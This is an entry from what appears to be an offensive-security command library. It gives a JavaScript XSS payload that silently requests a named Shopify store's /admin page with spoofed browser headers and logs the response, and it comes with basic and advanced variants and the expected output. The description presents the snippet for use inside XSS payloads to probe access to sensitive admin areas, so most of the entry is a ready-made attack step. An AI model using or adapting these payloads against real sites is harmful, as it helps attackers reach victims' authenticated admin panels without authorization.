---
id: cmd-uuid-1
data: >-
  var req = new XMLHttpRequest(); req.open('GET',
  'https://us-based-organization-h1.myshopify.com/admin', false);
  req.setRequestHeader('Upgrade-Insecure-Requests', '1');
  req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36');
  req.send(null); var headers = req.response.toLowerCase();
  console.log(headers);
tags:
  - xss
  - recon
  - javascript
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.904Z'
verified: false
validated: true
submitted: true
---
# Execute-XMLHttpRequest-to-Access-Admin-Page

## Command

```javascript
var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1'); req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'); req.send(null); var headers = req.response.toLowerCase(); console.log(headers);
```

## Description

This JavaScript command creates a synchronous XMLHttpRequest to fetch the target admin page, sets headers to mimic a legitimate browser request, and logs the lowercase response headers to the console. Use it in XSS payloads to verify access to sensitive admin areas.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| open(method, url, async) | Specifies GET, admin URL, and synchronous (false) mode | Yes |
| setRequestHeader(name, value) | Sets 'Upgrade-Insecure-Requests' to '1' and User-Agent to browser string | Yes |
| send(body) | Sends request with null body | Yes |
| response.toLowerCase() | Converts response text to lowercase | No |
| console.log | Outputs headers to browser console | Yes |

## Examples

### Basic Usage

```javascript
var req = new XMLHttpRequest(); req.open('GET', '/admin', false); req.send(null); console.log(req.responseText);
```

### Advanced Usage

```javascript
var req = new XMLHttpRequest(); req.open('GET', 'https://example.myshopify.com/admin', false); req.setRequestHeader('User-Agent', 'Mozilla/5.0 ...'); req.send(null); console.log(req.getAllResponseHeaders().toLowerCase());
```

## Expected Output

The response headers from the admin page in lowercase, logged to the browser console, e.g., "content-type: text/html..." confirming successful access without CORS issues.

## Related

- [[Related Procedure|procedures/Trigger-XSS-by-Opening-Image-in-New-Tab]]
